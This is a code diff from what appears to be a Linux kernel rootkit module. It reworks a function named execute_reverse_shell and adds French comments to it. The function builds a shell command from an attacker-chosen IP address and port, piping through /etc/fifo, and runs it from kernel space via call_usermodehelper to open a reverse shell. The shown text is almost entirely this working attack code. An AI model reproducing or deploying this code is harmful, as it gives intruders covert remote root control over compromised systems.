@@ -9,46 +9,51 @@
 #define EXEC_P2 " >/etc/fifo"
 				
 
+void execute_reverse_shell(struct work_struct *work) {
+    struct shell_params *params = (struct shell_params *)work;
 
-
-void execute_reverse_shell(struct work_struct *work){
-    //We know the strings are allocated right after the work in the struct shell_params, so we cast it
-    int err;
-    struct shell_params *params = (struct shell_params*)work;
+    // Déclaration de l'environnement
     char *envp[] = {
-                        HOME,
-                        TERM,
-                        params->target_ip,
-                        params->target_port,
-                        NULL
-                    }; //Null terminated
-    
-    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
+        HOME,
+        TERM,
+        params->target_ip,
+        params->target_port,
+        NULL
+    }; // Null terminated
+
+    // Allocation et initialisation de la commande à exécuter
+    char *exec = kmalloc(sizeof(char) * 256, GFP_KERNEL);
     memset(exec, 0, sizeof(char) * 256);
-    //char *argv[] = {};
-    char *argv[] = {
-                        SHELL,
-                        "-c",
-                        exec,
-                        NULL
-                    };
-    
+
+    // Construction de la commande avec les valeurs actuelles de l'IP et du port
     strcat(exec, EXEC_P1);
     strcat(exec, params->target_ip);
     strcat(exec, " ");
     strcat(exec, params->target_port);
     strcat(exec, EXEC_P2);
+
+    // Arguments pour call_usermodehelper
+    char *argv[] = {
+        SHELL,
+        "-c",
+        exec,
+        NULL
+    };
+
+    // Impression pour le débogage
     printk(KERN_INFO ":: Starting reverse shell %s\n", exec);
-    
-    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if(err<0){
+
+    // Exécution de la commande en mode utilisateur
+    int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (err < 0) {
         printk(KERN_INFO ":: Error executing usermodehelper.\n");
     }
+
+    // Libération de la mémoire allouée
     kfree(exec);
     kfree(params->target_ip);
     kfree(params->target_port);
     kfree(params);
-
 }
 
 
